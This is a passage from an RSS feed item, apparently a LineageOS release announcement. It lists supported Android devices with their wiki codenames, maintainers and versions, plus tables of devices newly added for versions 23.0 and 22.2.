      <td>chandu078, LucasBlackLu</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus Ace 3</td>
      <td><a href="https://wiki.lineageos.org/devices/astonc">astonc</a></td>
      <td>inferno0230</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus Ace 3V</td>
      <td><a href="https://wiki.lineageos.org/devices/audi">audi</a></td>
      <td>anky894</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus Ace 5</td>
      <td><a href="https://wiki.lineageos.org/devices/giuliac">giuliac</a></td>
      <td>chandu078, madmax</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus Nord 4</td>
      <td><a href="https://wiki.lineageos.org/devices/avalon">avalon</a></td>
      <td>anky894</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus Nord 5</td>
      <td><a href="https://wiki.lineageos.org/devices/lexus">lexus</a></td>
      <td>grepfox</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus Nord CE 2 Lite 5G</td>
      <td><a href="https://wiki.lineageos.org/devices/oscaro">oscaro</a></td>
      <td>Vivekachooz</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus Nord CE 3 Lite 5G / OnePlus Nord N30 5G</td>
      <td><a href="https://wiki.lineageos.org/devices/larry">larry</a></td>
      <td>Vivekachooz</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus Nord CE4</td>
      <td><a href="https://wiki.lineageos.org/devices/benz">benz</a></td>
      <td>inferno0230</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus Nord N20</td>
      <td><a href="https://wiki.lineageos.org/devices/gunnar">gunnar</a></td>
      <td>tangalbert919</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus Nord N200</td>
      <td><a href="https://wiki.lineageos.org/devices/dre">dre</a></td>
      <td>tangalbert919, elginsk8r</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus Pad 2 Pro / OnePlus Pad 3</td>
      <td><a href="https://wiki.lineageos.org/devices/erhai">erhai</a></td>
      <td>LuK1337, bgcngm</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus Pad Pro / OnePlus Pad 2</td>
      <td><a href="https://wiki.lineageos.org/devices/caihong">caihong</a></td>
      <td>inferno0230</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Razer Edge 5G / Razer Edge WiFi</td>
      <td><a href="https://wiki.lineageos.org/devices/nicole">nicole</a></td>
      <td>AnierinBliss, balika011, mikeioannina, npjohnson</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Realme 10 Pro 5G</td>
      <td><a href="https://wiki.lineageos.org/devices/luigi">luigi</a></td>
      <td>Vivekachooz</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Realme 9 Pro 5G / Realme 9 5G / Realme Q5</td>
      <td><a href="https://wiki.lineageos.org/devices/oscar">oscar</a></td>
      <td>Vivekachooz</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy A21s</td>
      <td><a href="https://wiki.lineageos.org/devices/a21s">a21s</a></td>
      <td>DaemonMCR</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy A71</td>
      <td><a href="https://wiki.lineageos.org/devices/a71">a71</a></td>
      <td>Haky86</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy F62 / Samsung Galaxy M62</td>
      <td><a href="https://wiki.lineageos.org/devices/f62">f62</a></td>
      <td>Linux4</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy Note10 5G</td>
      <td><a href="https://wiki.lineageos.org/devices/d1x">d1x</a></td>
      <td>Rocky7842, Linux4</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy Note10</td>
      <td><a href="https://wiki.lineageos.org/devices/d1">d1</a></td>
      <td>Linux4</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy Note10+ 5G</td>
      <td><a href="https://wiki.lineageos.org/devices/d2x">d2x</a></td>
      <td>Linux4</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy Note10+</td>
      <td><a href="https://wiki.lineageos.org/devices/d2s">d2s</a></td>
      <td>Linux4</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy S10 5G</td>
      <td><a href="https://wiki.lineageos.org/devices/beyondx">beyondx</a></td>
      <td>Linux4</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy S10</td>
      <td><a href="https://wiki.lineageos.org/devices/beyond1lte">beyond1lte</a></td>
      <td>Linux4</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy S10+</td>
      <td><a href="https://wiki.lineageos.org/devices/beyond2lte">beyond2lte</a></td>
      <td>Linux4</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy S10e</td>
      <td><a href="https://wiki.lineageos.org/devices/beyond0lte">beyond0lte</a></td>
      <td>Linux4</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy S20 (4G/5G)</td>
      <td><a href="https://wiki.lineageos.org/devices/x1s">x1s</a></td>
      <td>ExtremeXT, fcuzzocrea</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy S20 FE (Exynos)</td>
      <td><a href="https://wiki.lineageos.org/devices/r8s">r8s</a></td>
      <td>CmdCtrlDevic3</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy S20 FE (Snapdragon) / Samsung Galaxy S20 FE 5G</td>
      <td><a href="https://wiki.lineageos.org/devices/r8q">r8q</a></td>
      <td>ata-kaner</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy S20 Ultra (5G)</td>
      <td><a href="https://wiki.lineageos.org/devices/z3s">z3s</a></td>
      <td>ExtremeXT, fcuzzocrea</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy S20+ (4G/5G)</td>
      <td><a href="https://wiki.lineageos.org/devices/y2s">y2s</a></td>
      <td>ExtremeXT, fcuzzocrea</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy Tab A7 10.4 2020 (LTE)</td>
      <td><a href="https://wiki.lineageos.org/devices/gta4l">gta4l</a></td>
      <td>chrmhoffmann</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy Tab A7 10.4 2020 (Wi-Fi)</td>
      <td><a href="https://wiki.lineageos.org/devices/gta4lwifi">gta4lwifi</a></td>
      <td>chrmhoffmann</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy Tab S6 Lite (LTE)</td>
      <td><a href="https://wiki.lineageos.org/devices/gta4xl">gta4xl</a></td>
      <td>haggertk, Linux4</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy Tab S6 Lite (Wi-Fi)</td>
      <td><a href="https://wiki.lineageos.org/devices/gta4xlwifi">gta4xlwifi</a></td>
      <td>Linux4, haggertk</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy Tab S7 (LTE)</td>
      <td><a href="https://wiki.lineageos.org/devices/gts7l">gts7l</a></td>
      <td>bgcngm</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Samsung Galaxy Tab S7 (Wi-Fi)</td>
      <td><a href="https://wiki.lineageos.org/devices/gts7lwifi">gts7lwifi</a></td>
      <td>bgcngm</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Solana Saga</td>
      <td><a href="https://wiki.lineageos.org/devices/ingot">ingot</a></td>
      <td>mikeioannina, npjohnson, tomoms</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Sony Xperia 1 II</td>
      <td><a href="https://wiki.lineageos.org/devices/pdx203">pdx203</a></td>
      <td>hellobbn</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Sony Xperia 1 III</td>
      <td><a href="https://wiki.lineageos.org/devices/pdx215">pdx215</a></td>
      <td>hellobbn</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Sony Xperia 1 IV</td>
      <td><a href="https://wiki.lineageos.org/devices/pdx223">pdx223</a></td>
      <td>Tuan Anh</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Sony Xperia 1 V</td>
      <td><a href="https://wiki.lineageos.org/devices/pdx234">pdx234</a></td>
      <td>hellobbn</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Sony Xperia 10 IV</td>
      <td><a href="https://wiki.lineageos.org/devices/pdx225">pdx225</a></td>
      <td>LuK1337, jmpfbmx</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Sony Xperia 10 Plus</td>
      <td><a href="https://wiki.lineageos.org/devices/mermaid">mermaid</a></td>
      <td>LuK1337</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Sony Xperia 10 V</td>
      <td><a href="https://wiki.lineageos.org/devices/pdx235">pdx235</a></td>
      <td>jmpfbmx, LuK1337</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Sony Xperia 10</td>
      <td><a href="https://wiki.lineageos.org/devices/kirin">kirin</a></td>
      <td>LuK1337</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Sony Xperia 5 II</td>
      <td><a href="https://wiki.lineageos.org/devices/pdx206">pdx206</a></td>
      <td>kyasu, hellobbn</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Sony Xperia 5 III</td>
      <td><a href="https://wiki.lineageos.org/devices/pdx214">pdx214</a></td>
      <td>kyasu, hellobbn</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Sony Xperia 5 IV</td>
      <td><a href="https://wiki.lineageos.org/devices/pdx224">pdx224</a></td>
      <td>Tuan Anh, wolfhechel</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Sony Xperia 5 V</td>
      <td><a href="https://wiki.lineageos.org/devices/pdx237">pdx237</a></td>
      <td>kyasu, hellobbn</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Sony Xperia XA2 Plus</td>
      <td><a href="https://wiki.lineageos.org/devices/voyager">voyager</a></td>
      <td>LuK1337</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Sony Xperia XA2 Ultra</td>
      <td><a href="https://wiki.lineageos.org/devices/discovery">discovery</a></td>
      <td>LuK1337</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Sony Xperia XA2</td>
      <td><a href="https://wiki.lineageos.org/devices/pioneer">pioneer</a></td>
      <td>LuK1337, jmpfbmx</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi 12 Pro</td>
      <td><a href="https://wiki.lineageos.org/devices/zeus">zeus</a></td>
      <td>Adrianyyy, ArianK16a</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi 12</td>
      <td><a href="https://wiki.lineageos.org/devices/cupid">cupid</a></td>
      <td>Adrianyyy, ArianK16a</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi 12S Pro</td>
      <td><a href="https://wiki.lineageos.org/devices/unicorn">unicorn</a></td>
      <td>Adrianyyy, ArianK16a</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi 12S Ultra</td>
      <td><a href="https://wiki.lineageos.org/devices/thor">thor</a></td>
      <td>Adrianyyy, ArianK16a</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi 12T Pro / Xiaomi Redmi K50 Ultra</td>
      <td><a href="https://wiki.lineageos.org/devices/diting">diting</a></td>
      <td>Adrianyyy, ArianK16a</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi MIX Fold 2</td>
      <td><a href="https://wiki.lineageos.org/devices/zizhan">zizhan</a></td>
      <td>Adrianyyy, ArianK16a</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi Mi 10 Pro</td>
      <td><a href="https://wiki.lineageos.org/devices/cmi">cmi</a></td>
      <td>luffitys</td>
      <td>22.2</td>
    </tr>
    <tr>
      <td>Xiaomi Mi 10</td>
      <td><a href="https://wiki.lineageos.org/devices/umi">umi</a></td>
      <td>0xCAFEBABE, przekichane</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi Mi 10T Lite 5G / Xiaomi Mi 10i 5G / Xiaomi Redmi Note 9 Pro 5G</td>
      <td><a href="https://wiki.lineageos.org/devices/gauguin">gauguin</a></td>
      <td>Penguin766, Lynnrin</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi Mi 9T / Xiaomi Redmi K20 (China) / Xiaomi Redmi K20 (India)</td>
      <td><a href="https://wiki.lineageos.org/devices/davinci">davinci</a></td>
      <td>ArianK16a</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi Mi Note 10 / Xiaomi Mi Note 10 Pro / Xiaomi Mi CC9 Pro</td>
      <td><a href="https://wiki.lineageos.org/devices/tucana">tucana</a></td>
      <td>SanyaPilot</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi POCO F3 / Xiaomi Redmi K40 / Xiaomi Mi 11X</td>
      <td><a href="https://wiki.lineageos.org/devices/alioth">alioth</a></td>
      <td>SahilSonar, SebaUbuntu, althafvly, chrmhoffmann</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi POCO F5 (Global) / Xiaomi POCO F5 (India) / Xiaomi Redmi Note 12 Turbo</td>
      <td><a href="https://wiki.lineageos.org/devices/marble">marble</a></td>
      <td>Adrianyyy, ArianK16a</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi POCO F5 Pro / Xiaomi Redmi K60</td>
      <td><a href="https://wiki.lineageos.org/devices/mondrian">mondrian</a></td>
      <td>Adrianyyy, ArianK16a</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi Redmi 3S / Xiaomi Redmi 3X / Xiaomi Redmi 4 (India) / Xiaomi Redmi 4X / Xiaomi Redmi Note 5A Prime / Xiaomi Redmi Y1 Prime</td>
      <td><a href="https://wiki.lineageos.org/devices/Mi8937">Mi8937</a></td>
      <td>0xCAFEBABE</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi Redmi 4A / Xiaomi Redmi 5A / Xiaomi Redmi Note 5A Lite / Xiaomi Redmi Y1 Lite</td>
      <td><a href="https://wiki.lineageos.org/devices/Mi8917">Mi8917</a></td>
      <td>0xCAFEBABE</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi Redmi 7A / Xiaomi Redmi 8 / Xiaomi Redmi 8A / Xiaomi Redmi 8A Dual</td>
      <td><a href="https://wiki.lineageos.org/devices/Mi439">Mi439</a></td>
      <td>0xCAFEBABE</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi Redmi Note 10 Pro / Xiaomi Redmi Note 10 Pro (India) / Xiaomi Redmi Note 10 Pro Max (India)</td>
      <td><a href="https://wiki.lineageos.org/devices/sweet">sweet</a></td>
      <td>basamaryan, danielml3</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi Redmi Note 13 Pro 5G / Xiaomi Redmi Note 13 Pro 5G (India) / Xiaomi Redmi Note 13 Pro 5G (China) / Xiaomi POCO X6 5G / Xiaomi POCO X6 5G (India)</td>
      <td><a href="https://wiki.lineageos.org/devices/garnet">garnet</a></td>
      <td>adarshgrewal</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi Redmi Note 7 Pro</td>
      <td><a href="https://wiki.lineageos.org/devices/violet">violet</a></td>
      <td>0xCAFEBABE</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Xiaomi Redmi Note 8 / Xiaomi Redmi Note 8T</td>
      <td><a href="https://wiki.lineageos.org/devices/ginkgo">ginkgo</a></td>
      <td>Skyblueborb, mikeioannina, programminghoch10</td>
      <td>23.0</td>
    </tr>
  </tbody>
</table>

<h4 id="added-23-devices">Added 23 devices</h4>

<table>
  <thead>
    <tr>
      <th>Device name</th>
      <th>Wiki</th>
      <th>Maintainers</th>
      <th>Moved from</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>LG V60 ThinQ</td>
      <td><a href="https://wiki.lineageos.org/devices/timelm">timelm</a></td>
      <td>pnguyen879</td>
      <td>22.2</td>
    </tr>
    <tr>
      <td>Xiaomi POCO F6 Pro / Xiaomi Redmi K70</td>
      <td><a href="https://wiki.lineageos.org/devices/vermeer">vermeer</a></td>
      <td>Lunark</td>
      <td>&nbsp;</td>
    </tr>
  </tbody>
</table>

<h4 id="added-222-devices">Added 22.2 devices</h4>

<table>
  <thead>
    <tr>
      <th>Device name</th>
      <th>Wiki</th>
      <th>Maintainers</th>
      <th>Moved from</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Google Jamboard [Android TV]</td>
      <td><a href="https://wiki.lineageos.org/devices/baracus">baracus</a></td>
      <td>npjohnson, webgeek1234</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>Google Jamboard [Tablet]</td>
      <td><a href="https://wiki.lineageos.org/devices/baracus_tab">baracus_tab</a></td>
      <td>npjohnson, webgeek1234</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>Nubia X</td>
      <td><a href="https://wiki.lineageos.org/devices/nx616j">nx616j</a></td>
      <td>rtx4d</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>Xiaomi Mi Note 2</td>
      <td><a href="https://wiki.lineageos.org/devices/scorpio">scorpio</a></td>
      <td>Onelots</td>
      <td>18.1</td>
    </tr>
  </tbody>
</table>


  </div></div>]]></description>
        </item>
    </channel>
</rss>